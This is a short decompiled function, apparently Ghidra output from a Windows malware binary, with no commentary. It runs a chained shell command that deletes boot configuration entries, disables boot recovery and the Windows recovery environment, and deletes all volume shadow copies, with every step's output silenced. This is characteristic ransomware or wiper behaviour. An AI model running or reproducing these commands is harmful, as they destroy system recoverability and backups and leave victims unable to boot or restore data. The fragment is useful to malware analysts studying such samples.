undefined8 FUN_140011a70(void)

{
  FUN_14000ff20("bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1 & bcdedit /set {default} recoveryenabled No >nul 2>&1 & bcdedit /delete {default} /f >nul 2>&1 & bcdedit /delete {bootmgr} /f >nul 2>&1 & bcdedit /delete {current} /f >nul 2>&1 & bcdedit /delete {memdiag} /f >nul 2>&1 & bcdedit /set {globalsettings} advancedoptions false >nul 2>&1 & bcdedit /set {globalsettings} optionsedit false >nul 2>&1 & reagentc /disable >nul 2>&1 & wmic shadowcopy delete /nointeractive >nul 2>&1 & vssadmin delete shadows /all /quiet >nul 2>&1",
                60000);
  FUN_1400106a0();
  FUN_140011650();
  return 0;
}
